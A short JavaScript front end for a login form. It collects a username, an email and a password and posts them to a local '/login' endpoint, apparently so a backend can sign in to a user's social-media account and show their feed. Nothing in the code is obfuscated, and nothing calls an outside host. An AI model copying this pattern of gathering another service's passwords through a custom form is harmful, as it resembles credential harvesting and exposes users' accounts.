document.addEventListener("DOMContentLoaded", function () {
  const submitBtn = document.getElementById("submit-btn");
  const form = document.getElementById("access-form");
  const loadingDiv = document.getElementById("loading");
  const resultDiv = document.getElementById("result");

  submitBtn.addEventListener("click", async function () {
    const username = document.getElementById("username")?.value;
    const email = document.getElementById("email")?.value;
    const password = document.getElementById("password")?.value;

    if (!username || !email || !password) {
      resultDiv.innerText = "❌ Please fill in all fields.";
      resultDiv.style.color = "gray";
      return;
    }

    form.style.display = "none";
    loadingDiv.style.display = "block";
    resultDiv.innerText = "";

    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error("timeout")), 40000)
    );

    const loginPromise = fetch("http://localhost:8000/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        auth_info_1: username,
        auth_info_2: email,
        password: password,
      }),
    });

    try {
      const res = await Promise.race([loginPromise, timeoutPromise]);

      const data = await res.json();
      loadingDiv.style.display = "none";

      if (!res.ok) {
        resultDiv.innerText = "Wrong username, email or password. Try again later.";
        resultDiv.style.color = "gray";
      } else {
        resultDiv.innerText = "You have granted access to see your feed.";
        resultDiv.style.color = "green";
      }
    } catch (err) {
      loadingDiv.style.display = "none";
      if (err.message === "timeout") {
        resultDiv.innerText =
          "Logout from the web using browser in settings/sessions and try again later.";
      } else {
        resultDiv.innerText = "Wrong username, email or password. Try again later.";
      }
      resultDiv.style.color = "gray";
    }
  });
});
